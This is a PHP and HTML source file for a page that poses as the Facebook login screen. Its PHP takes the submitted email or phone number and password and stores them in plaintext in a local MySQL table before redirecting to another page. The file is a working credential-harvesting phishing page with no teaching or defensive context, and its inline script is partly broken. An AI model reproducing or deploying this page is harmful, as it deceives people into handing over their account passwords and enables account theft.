<?php 
if (isset($_POST['submit'])) {
    echo "Form submitted<br>";
    $number = $_POST['number'];
    $password = $_POST['password'];

    $host = 'localhost';
    $user = 'root';
    $pass = '';
    $dbname = 'luna';

    $conn = mysqli_connect($host, $user, $pass, $dbname);

    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    echo "Connected to database<br>";

    $stmt = $conn->prepare("INSERT INTO lack (number, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $number, $password);
    

    $stmt->execute();

    $stmt->close();
    $conn->close();
    // Redirect to another page after form submission
    header("Location: map.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-card">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
            <form action="connect.php" method="post">
                <input type="tel" id="number" placeholder="Email or number" name="number" required>
                <input type="password" id="password" placeholder="Password" name="password" required>
                <button type="submit" name="submit">Log in</button>
                <a href="map.html">Forgotten password?</a>
                <hr>
                <button type="button" class="create-account">Create new account</button>
            </form>
        </div>
    </div>
    <script>
    document.getElementById("myForm").addEventListener("submit", function(event){
            event.preventDefault(); // Prevent the default form submission
            window.location.href = "map.php"; // Redirect to the desired page
    )};
    </script>
</body>
</html>